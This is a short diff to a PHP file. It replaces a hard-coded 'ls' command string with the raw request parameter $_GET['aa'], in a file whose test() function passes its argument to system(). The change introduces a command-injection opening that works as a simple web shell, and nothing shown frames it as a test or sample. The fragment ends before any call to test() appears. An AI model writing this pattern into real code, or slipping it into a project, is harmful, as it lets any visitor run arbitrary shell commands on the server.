@@ -1,6 +1,6 @@
 <?php
 
-$s = "ls";
+$s = $_GET['aa'];
 
 function test($a){
     system($a);
